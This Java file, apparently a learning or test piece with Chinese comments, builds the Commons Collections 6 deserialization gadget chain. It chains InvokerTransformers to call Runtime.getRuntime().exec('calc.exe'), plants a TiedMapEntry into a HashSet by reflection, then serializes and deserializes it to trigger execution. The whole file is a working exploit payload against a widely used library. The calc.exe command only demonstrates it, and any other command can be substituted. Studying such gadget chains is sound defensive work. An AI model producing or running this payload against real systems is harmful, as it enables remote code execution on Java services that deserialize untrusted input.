package CC;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;

public class CC6Test {
    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
        };

        ChainedTransformer chain = new ChainedTransformer(transformers);
        HashMap hashMap = new HashMap();
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap, chain);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "foo");

        HashSet hashSet = new HashSet(1);
        hashSet.add("foo");
        //获取HashSet的map属性
        Field field = hashSet.getClass().getDeclaredField("map");
        field.setAccessible(true);
        //获取HashSet集合中的map属性的hashmap对象
        HashMap hashset_map = (HashMap)field.get(hashSet);

        //获取HashMap的table属性
        field = HashMap.class.getDeclaredField("table");
        field.setAccessible(true);
        //从hashmap对象中获取table属性的值（返回的是一个HashMap.Node类型的数组）
        Object[] array = (Object[]) field.get(hashset_map);
        Object node = array[0];
        if(node == null){
            node = array[1];
        }
        Field keyField = null;
        //获取HashMap.Node类中的key属性
        keyField = node.getClass().getDeclaredField("key");
        keyField.setAccessible(true);
        //然后将HashMap.Node类中的key属性设置为TiedMapEntry对象
        keyField.set(node, tiedMapEntry);

        //序列化  -->  反序列化
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(hashSet);
        oos.close();
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        ois.readObject();
    }
}